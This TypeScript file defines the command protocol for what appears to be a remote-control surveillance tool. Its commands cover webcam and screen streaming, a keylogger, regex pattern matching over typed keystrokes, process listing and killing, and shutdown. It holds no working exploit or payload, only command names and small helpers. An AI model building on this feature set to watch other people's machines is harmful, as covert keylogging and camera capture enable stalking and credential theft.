// Shared commands (matches C++ backend)
export enum Command {
  // Stream commands - webcam is default (works reliably)
  START_STREAM = "start_stream",           // Webcam stream (default)
  START_WEBCAM_STREAM = "start_webcam_stream",  // Explicit webcam
  START_SCREEN_STREAM = "start_screen_stream",  // Screen capture (may need permissions)
  STOP_STREAM = "stop_stream",
  
  // Single frame capture
  FRAME_CAPTURE = "frame_capture",         // Screen
  CAPTURE_WEBCAM = "capture_webcam",       // Webcam
  
  // Keylogger commands
  START_KEYLOGGER = "start_keylogger",
  STOP_KEYLOGGER = "stop_keylogger",
  
  // Pattern detection commands
  ADD_COMMON_PATTERNS = "add_common_patterns",
  CLEAR_PATTERNS = "clear_patterns",
  GET_TYPED_BUFFER = "get_typed_buffer",
  CLEAR_BUFFER = "clear_buffer",
  
  // Process commands
  LIST_PROCESS = "list_process",
  // Note: kill_process requires PID, use sendKillProcess() helper
  
  // System commands
  SHUTDOWN = "shutdown",
  
  // Misc
  PING = "ping"
}

export interface StreamStats {
  fps: number;
  frameCount: number;
  totalBytes: number;
}

export interface PatternMatch {
  patternName: string;
  matchedText: string;
}

export type ConnectionStatus = 'DISCONNECTED' | 'CONNECTING' | 'CONNECTED';

// Helper to create kill process command
export function killProcessCommand(pid: number): string {
  return `kill_process:${pid}`;
}

// Helper to add custom pattern
export function addPatternCommand(name: string, regex: string): string {
  return `add_pattern:${name}:${regex}`;
}

// Helper to remove pattern
export function removePatternCommand(name: string): string {
  return `remove_pattern:${name}`;
}